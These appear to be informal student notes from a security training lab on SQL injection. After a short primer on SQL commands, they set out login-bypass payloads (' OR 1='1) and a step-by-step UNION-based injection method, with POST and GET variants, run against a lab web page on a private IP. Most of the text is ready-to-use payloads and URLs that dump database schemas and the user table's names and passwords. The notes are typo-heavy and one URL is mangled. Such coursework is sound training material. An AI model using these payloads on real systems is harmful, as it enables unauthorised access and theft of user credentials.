default database

use information _scheam
contains information about all other databses

will find databses names, columns

show tables

Commands, such as below, 
are standardized across vendors, 
and can accomplish almost all tasks inside a Database:
SELECT
UPDATE
DELETE
CREATE
DROP



# Basic SQL Commands:
USE                  Select the database to use**
SELECT               extract data from databse
UPDATE               update data in a database
DELETE               delete data from a database
INSERT INTO          insert new data into a databse
CREATE DATABSE       create a new database
ALTER DATABASE       modify a existing databse
CREATE TABLE         create a new table
DROP TABLE           delete an existing table
CREATE INDEX         create an index
DROP INDEX           delete an index
UNION                combine the result-set of twoo or more equal statements

informations schema
->tables
--->columns
----->table

golden statement
select table_schema,table_name,column_name from informations_schema.columns ;

show tables from session

select name,cost,color from session.car ;
select name,size,cosr from session.tires ;

# do activity 
https://sqlbolt.com/lesson/select_queries_introduction

# login/auth bypass
'
login:  ' OR 1='1
passw:  ' OR 1='1
go into web dev
copy raw post request
add ? after php
paste raw post request
tells server to get all thst infomstion to grab more information
result was the dumping of user information

## step one id vulnerable field bt fuzzing (post method)
interact " 'audi' OR 1='1 "
->show query
--> golden statement "select name, type, cost, color, year from car where name='ford'"
--> golden statement "select name, type, cost, color, year from car where name='dodge'"

## step two
once identified, test for my columns
audi 'UNION SELECT 1,2,3,4,5 #
 golden statement
 UNION SELECT table_schema,table_name,column_name from information_schema.columns #
# edit goldne statemtn

Audi ' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
Audi ' UNION SELECT type,2,cost,color,year from session.car #
Audi ' UNION SELECT carid,2,type,name,year from session.car #

### record the databses as such
databases:
session
      tires
          tireid
          name
          size
          cost
      car
          rgagasd
          gasgdsa
          werqsa
## step one id vulnerable field bt fuzzing (get method)
pay attention to url and what changes with each selection
http://10.50.36.14/uniondemo.php?Selectionhttp://10.50.36.14/uniondemo.php?Selection=2%20UNION%20SELECT%20id,name,pass%20from%20session.user=4 OR 1=1
after fuzzing, only 1 is properly configured, all others (2,3,4) are vulnerable

## step two: identify how many columns
http://10.50.36.14/uniondemo.php?Selection=2 UNION SELECT 1,2,3
 Displayed 1,3,2

## step 3 edit golden statement to dump database (same as post method)

copy golden statement but swap table name and column name to format correctly
 UNION SELECT table_schema,table_name,column_name from information_schema.columns 
 UNION SELECT table_schema,column_name,table_name from information_schema.columns 
pass the golden statemnet after the selection=2 into url 
10.50.36.14/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
## step 4 craft queries get mone
10.50.36.14/uniondemo.php?Selection=2 UNION SELECT id,name,@@version from information_schema.columns
http://10.50.36.14/uniondemo.php?Selection=2%20UNION%20SELECT%20id,name,pass%20from%20session.user
input validation is the biggest defense against this in the fmf 



